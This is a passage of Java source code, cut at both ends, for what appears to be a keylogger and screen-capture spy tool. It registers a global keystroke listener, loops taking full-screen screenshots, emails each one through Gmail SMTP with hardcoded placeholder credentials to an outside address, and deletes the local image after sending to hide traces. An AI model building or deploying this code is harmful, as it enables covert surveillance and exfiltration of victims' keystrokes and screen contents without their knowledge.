 GlobalScreen.getInstance().addNativeKeyListener(new ProjectGlobalDale20()); //Initiate global logging

        do {


            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()); //Taking a screenshot and writing it to a file previously declared as 'a'.
            BufferedImage capture = new Robot().createScreenCapture(screenRect);
            ImageIO.write(capture, "jpg", a);

            final String username = "JohnConnor@gmail.com"; //Hypothetical email
            final String password = "pa55w0rd"; //Hypothethical password

            Properties props = new Properties();  // The following is all neccessary for connecting to the gmail account
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = Session.getInstance(props,
                    new javax.mail.Authenticator() {
                        protected PasswordAuthentication getPasswordAuthentication() {
                            return new PasswordAuthentication(username, password);
                        }
                    });

            try { //The following is the actual sending of the file

                Message message = new MimeMessage(session);  
                message.setFrom(new InternetAddress("JohnConnor@gmail.com")); //Sender
                message.setRecipients(Message.RecipientType.TO,
                        InternetAddress.parse("PolPot@gmail.com")); //Recipient
                message.setSubject("Testing Subject");

                MimeMultipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                String filename = "E:\\1.jpg";
                DataSource source = new FileDataSource(filename);
                messageBodyPart.setDataHandler(new DataHandler(source));
                messageBodyPart.setFileName(filename);
                multipart.addBodyPart(messageBodyPart);
                message.setContent(multipart);

                Transport.send(message);

                System.out.println("First sent");

            } finally {

                a.delete(); //This deletes the file (known as a) from the E:// drive AFTER it is sent.

            }

           
